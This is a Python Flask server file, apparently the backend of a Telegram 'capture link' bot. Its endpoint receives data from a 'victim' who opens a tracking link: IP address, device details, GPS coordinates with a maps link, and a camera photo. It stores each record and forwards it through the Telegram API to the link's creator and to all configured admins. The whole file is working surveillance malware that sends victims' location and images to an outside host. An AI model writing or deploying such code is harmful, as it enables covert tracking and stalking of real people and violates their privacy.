import os
import json
import base64
import logging
from flask import Flask, request, jsonify
from telegram import Bot
import requests
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
bot = Bot(token=BOT_TOKEN)

DATA_DIR = '/tmp/bot_data'
os.makedirs(DATA_DIR, exist_ok=True)

def get_client_ip():
    """Get real client IP"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr or 'Unknown'

def send_photo_to_admin(chat_id, photo_base64, caption):
    """Send captured photo to admin"""
    try:
        photo_data = base64.b64decode(photo_base64.split(',')[1] if ',' in photo_base64 else photo_base64)
        
        # Save to disk first
        photo_dir = os.path.join(DATA_DIR, 'photos')
        os.makedirs(photo_dir, exist_ok=True)
        photo_path = os.path.join(photo_dir, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        with open(photo_path, 'wb') as f:
            f.write(photo_data)
        
        # Send via Telegram
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': ('capture.jpg', photo_data, 'image/jpeg')}
        data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
        
        response = requests.post(url, files=files, data=data)
        logger.info(f"Photo sent: {response.status_code}")
        return True
    except Exception as e:
        logger.error(f"Error sending photo: {e}")
        return False

def send_text_to_admin(chat_id, text):
    """Send text message to admin"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'Markdown'
        }
        requests.post(url, json=data)
        return True
    except Exception as e:
        logger.error(f"Error sending text: {e}")
        return False

@app.route('/<link_id>', methods=['POST'])
def capture(link_id):
    """Receive captured data from victim"""
    try:
        data = request.get_json()
        
        # Load links data
        links_file = os.path.join(DATA_DIR, 'links.json')
        links = {}
        if os.path.exists(links_file):
            with open(links_file, 'r') as f:
                links = json.load(f)
        
        if link_id not in links:
            return jsonify({'error': 'Invalid link'}), 404
        
        link_data = links[link_id]
        creator_id = link_data['creator_id']
        
        # Prepare capture record
        client_ip = get_client_ip()
        capture_record = {
            'ip': client_ip,
            'user_agent': data.get('user_agent', 'Unknown'),
            'timestamp': data.get('timestamp', datetime.now().isoformat()),
            'screen_res': data.get('screen_res', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'language': data.get('language', 'Unknown'),
            'hasCamera': data.get('hasCamera', False),
            'hasMic': data.get('hasMic', False),
            'hasLocation': data.get('hasLocation', False),
            'latitude': data.get('latitude'),
            'longitude': data.get('longitude'),
            'accuracy': data.get('accuracy'),
            'photo': data.get('photo')  # Base64 encoded photo
        }
        
        # Store in links data
        link_data['captures'].append(capture_record)
        links[link_id] = link_data
        with open(links_file, 'w') as f:
            json.dump(links, f)
        
        # Build notification for creator
        perms = []
        if data.get('hasCamera'): perms.append('📸 Camera')
        if data.get('hasMic'): perms.append('🎙️ Microphone')
        if data.get('hasLocation'): perms.append('📍 Location')
        
        caption = (
            f"⚠️ **New Capture!**\n\n"
            f"🔗 Link ID: `{link_id}`\n"
            f"🌐 IP: `{client_ip}`\n"
            f"📱 Platform: {data.get('platform', 'Unknown')}\n"
            f"🖥️ Screen: {data.get('screen_res', 'Unknown')}\n"
            f"🌍 Language: {data.get('language', 'Unknown')}\n"
            f"✅ Permissions granted: {', '.join(perms) if perms else 'None'}\n"
        )
        
        if data.get('latitude') and data.get('longitude'):
            maps_url = f"https://maps.google.com/maps?q={data['latitude']},{data['longitude']}"
            caption += f"📍 Location: [{data['latitude']}, {data['longitude']}]({maps_url})\n"
            if data.get('accuracy'):
                caption += f"📍 Accuracy: ±{data['accuracy']}m\n"
        
        # Send to creator
        if data.get('photo'):
            send_photo_to_admin(creator_id, data['photo'], caption)
        else:
            send_text_to_admin(creator_id, caption)
        
        # Also notify all admins
        admin_ids = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]
        for admin_id in admin_ids:
            if admin_id != creator_id:
                admin_caption = f"📸 Capture by @{link_data.get('creator_username', 'Unknown')}\n\n{caption}"
                if data.get('photo'):
                    send_photo_to_admin(admin_id, data['photo'], admin_caption)
                else:
                    send_text_to_admin(admin_id, admin_caption)
        
        return jsonify({'status': 'success'}), 200
        
    except Exception as e:
        logger.error(f"Capture error: {e}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
